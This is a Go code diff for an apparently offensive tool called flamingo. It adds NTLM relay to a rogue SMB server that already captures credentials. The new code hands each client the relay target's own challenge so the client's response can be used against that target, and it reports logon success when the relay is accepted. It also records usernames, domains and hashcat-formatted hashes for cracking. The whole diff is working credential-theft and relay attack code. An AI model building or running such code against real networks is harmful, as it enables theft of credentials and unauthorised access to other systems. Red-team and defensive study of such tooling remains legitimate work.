@@ -54,10 +54,17 @@ type ConfSMB struct {
 	BindPort     uint16
 	BindHost     string
 	RecordWriter *RecordWriter
-	serverGUID   uuid.UUID
-	shutdown     bool
-	listener     net.Listener
-	m            sync.Mutex
+
+	// Responder decides the challenge a client is answered with and whether
+	// it is told the logon succeeded. Nil — the default — is capture only:
+	// flamingo's own fixed challenge and always STATUS_LOGON_FAILURE. A
+	// relay responder makes this listener forward to a target instead.
+	Responder NTLMResponder
+
+	serverGUID uuid.UUID
+	shutdown   bool
+	listener   net.Listener
+	m          sync.Mutex
 }
 
 // NewConfSMB creates a default configuration for the SMB capture server.
@@ -124,6 +131,13 @@ type smbSession struct {
 	// clientFlags and clientVersion come from the NTLMSSP NEGOTIATE message.
 	clientFlags   uint32
 	clientVersion string
+
+	// exchange is this connection's NTLM exchange as handed to the
+	// responder, and challenge the CHALLENGE message the client was
+	// answered with. For a relayed exchange that challenge is the target's,
+	// not flamingo's, which is what the hashcat line is formatted against.
+	exchange  *NTLMExchange
+	challenge []byte
 
 	// callingName is the NetBIOS calling name from a port 139 session
 	// request, used as the workstation when the client supplies none.
@@ -235,8 +249,13 @@ func (s *smbSession) sessionSetup(p wire.PacketCodec) bool {
 	switch NTLMMessageType(msg) {
 	case NTLMTypeNegotiate:
 		s.clientFlags, s.clientVersion = ParseNTLMNegotiate(msg)
+		challenge, ok := s.challengeFor(msg)
+		if !ok {
+			return false
+		}
+		s.challenge = challenge
 		resp := &wire.SessionSetupResponse{
-			SecurityBuffer: smbSPNEGONegTokenResp(NTLMChallengeMessage(s.clientFlags)),
+			SecurityBuffer: smbSPNEGONegTokenResp(challenge),
 		}
 		resp.Status = smbStatusMoreProcessingRequired
 		resp.Flags = wire.SMB2_FLAGS_SERVER_TO_REDIR
@@ -252,10 +271,16 @@ func (s *smbSession) sessionSetup(p wire.PacketCodec) bool {
 			return false
 		}
 		s.recordAuth(auth)
-		// Capture only: the credential is already recorded, so the logon is
-		// always refused. This phase neither relays nor serves files.
+		// The credential is recorded before the outcome is decided, so a
+		// relay that fails has still handed us the hash.
 		resp := &wire.SessionSetupResponse{}
 		resp.Status = smbStatusLogonFailure
+		if s.authenticated(auth, msg) {
+			// The relay target accepted this logon, so the client is told
+			// the truth. Nothing past authentication is served either way:
+			// the connection closes below.
+			resp.Status = smbStatusSuccess
+		}
 		resp.Flags = wire.SMB2_FLAGS_SERVER_TO_REDIR
 		resp.MessageId = p.MessageId()
 		resp.SessionId = s.sessionID
@@ -268,6 +293,52 @@ func (s *smbSession) sessionSetup(p wire.PacketCodec) bool {
 	return false
 }
 
+// challengeFor returns the CHALLENGE message to answer an NTLMSSP NEGOTIATE
+// with, and reports whether the exchange should continue.
+//
+// This is the one place the capture path decides what challenge a client
+// sees, and so the one place relaying substitutes itself. With no responder
+// configured it is flamingo's own fixed challenge, exactly as before; with a
+// relay responder it is the relay target's own challenge, which is what makes
+// the client's response usable against that target.
+func (s *smbSession) challengeFor(negotiate []byte) ([]byte, bool) {
+	responder := s.conf.Responder
+	if responder == nil {
+		return NTLMChallengeMessage(s.clientFlags), true
+	}
+
+	s.exchange = &NTLMExchange{
+		Proto:         "smb",
+		ServerAddr:    s.serverAddr(),
+		RemoteAddr:    s.conn.RemoteAddr().String(),
+		Type1:         negotiate,
+		Flags:         s.clientFlags,
+		ClientVersion: s.clientVersion,
+		Conn:          s.conn,
+	}
+	challenge, err := responder.Challenge(s.exchange)
+	if err != nil {
+		log.Debugf("smb no challenge for %s: %s", s.conn.RemoteAddr(), err)
+		return nil, false
+	}
+	s.exchange.Type2 = challenge
+	return challenge, true
+}
+
+// authenticated asks the responder whether the client should be told the
+// logon succeeded. Capture-only always refuses.
+func (s *smbSession) authenticated(a *NTLMAuth, type3 []byte) bool {
+	if s.conf.Responder == nil || s.exchange == nil {
+		return false
+	}
+	return s.conf.Responder.Authenticate(s.exchange, a, type3)
+}
+
+// serverAddr is the listen address as it appears in records.
+func (s *smbSession) serverAddr() string {
+	return fmt.Sprintf("%s:%d", s.conf.BindHost, s.conf.BindPort)
+}
+
 // recordAuth writes a captured AUTHENTICATE message to the record writer.
 func (s *smbSession) recordAuth(a *NTLMAuth) {
 	workstation := a.Workstation
@@ -275,14 +346,16 @@ func (s *smbSession) recordAuth(a *NTLMAuth) {
 		workstation = s.callingName
 	}
 	fields := map[string]string{
-		"_server":      fmt.Sprintf("%s:%d", s.conf.BindHost, s.conf.BindPort),
+		"_server":      s.serverAddr(),
 		"username":     a.User,
 		"domain":       a.Domain,
 		"workstation":  workstation,
 		"ntlm_version": a.NTLMVersion(),
 		"dialect":      s.dialect,
 	}
-	if line, mode := NTLMHashcat(a); line != "" {
+	// Formatted against the challenge this client was actually answered
+	// with, which is flamingo's own unless the exchange was relayed.
+	if line, mode := NTLMHashcatChallenge(a, NTLMServerChallenge(s.challenge)); line != "" {
 		fields["hashcat"] = line
 		fields["hashcat_mode"] = strconv.Itoa(mode)
 	}
